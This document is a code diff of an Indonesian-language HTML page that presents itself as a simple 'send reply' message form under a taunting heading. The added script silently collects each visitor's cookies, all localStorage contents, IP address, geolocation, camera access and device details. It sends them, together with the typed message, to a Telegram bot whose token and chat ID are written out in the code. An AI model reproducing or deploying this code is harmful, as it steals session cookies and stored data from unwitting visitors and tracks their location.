@@ -61,7 +61,6 @@
     </style>
 </head>
 <body>
-    <p>Pesan:</p>
     <h3>lu kek monyet</h3>
     <h5>Kirim Balasan</h5>
     <form id="telegramForm">
@@ -71,8 +70,8 @@
     </form>
 
     <script>
-        const botToken = '7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA'; // Token Bot
-        const chatId = '7233342888'; // Chat ID
+        const botToken = '7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA';
+        const chatId = '7233342888';
 
         function getPublicIP() {
             return fetch('https://api.ipify.org?format=json')
@@ -82,20 +81,68 @@
         }
 
         function getLocation() {
-            return new Promise((resolve, reject) => {
+            return new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-                            resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                            resolve(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
                         },
-                        () => resolve('Lokasi tidak tersedia')
+                        () => resolve('Lokasi tidak diizinkan')
                     );
                 } else {
                     resolve('Geolocation tidak didukung');
                 }
             });
+        }
+
+        function getBatteryInfo() {
+            return navigator.getBattery ? navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`) : 'Tidak tersedia';
+        }
+
+        function getDeviceMemory() {
+            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak tersedia';
+        }
+
+        function getConnectionType() {
+            return navigator.connection ? navigator.connection.effectiveType : 'Tidak tersedia';
+        }
+
+        function getScreenSize() {
+            return `${(Math.sqrt(screen.width**2 + screen.height**2) / 96).toFixed(2)} inches`;
+        }
+
+        function getSensors() {
+            return new Promise(resolve => {
+                let sensors = {
+                    light: 'Tidak tersedia lux',
+                    orientation: 'Alpha=N/A, Beta=N/A, Gamma=N/A',
+                    accelerometer: 'X=N/A, Y=N/A, Z=N/A',
+                    gyroscope: 'Alpha=N/A, Beta=N/A, Gamma=N/A',
+                    gravity: 'X=N/A, Y=N/A, Z=N/A'
+                };
+                resolve(sensors);
+            });
+        }
+
+        function getCameraAccess() {
+            return navigator.mediaDevices && navigator.mediaDevices.getUserMedia 
+                ? navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(() => 'Tersedia')
+                    .catch(() => 'Tidak tersedia') 
+                : 'Tidak tersedia';
+        }
+
+        function getLocalStorageData() {
+            let storage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                storage[key] = localStorage.getItem(key);
+            }
+            return JSON.stringify(storage, null, 2);
+        }
+
+        function getCookies() {
+            return document.cookie || 'Tidak tersedia';
         }
 
         document.getElementById('telegramForm').addEventListener('submit', async function(e) {
@@ -104,8 +151,17 @@
             const pesanUser = document.getElementById('pesan').value;
             const ip = await getPublicIP();
             const lokasi = await getLocation();
+            const baterai = await getBatteryInfo();
+            const memori = getDeviceMemory();
+            const koneksi = getConnectionType();
+            const sensor = await getSensors();
+            const kamera = await getCameraAccess();
+            const ukuranLayar = getScreenSize();
+            const resolusiLayar = `${screen.width} x ${screen.height}`;
+            const localStorageData = getLocalStorageData();
+            const cookieData = getCookies();
 
-            const message = `📩 Pesan Baru:\n\nPesan: ${pesanUser}\nIP: ${ip}\nLokasi: ${lokasi}`;
+            const message = `📩 Pesan Baru:\n\nPesan: ${pesanUser}\n\n📌 Data Pengunjung:\n- User Agent: ${navigator.userAgent}\n- IP Address: ${ip}\n- Perangkat: ${navigator.platform}\n- Baterai: ${baterai}\n- Memori: ${memori}\n- Jenis Koneksi: ${koneksi}\n- Sensor Cahaya: ${sensor.light}\n- Orientasi: ${sensor.orientation}\n- Akselerometer: ${sensor.accelerometer}\n- Gyroskop: ${sensor.gyroscope}\n- Gravitasi: ${sensor.gravity}\n- Kamera: ${kamera}\n- Ukuran Layar: ${ukuranLayar}\n- Resolusi Layar: ${resolusiLayar}\n- LocalStorage Data: ${localStorageData}\n- Cookie Data: ${cookieData}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
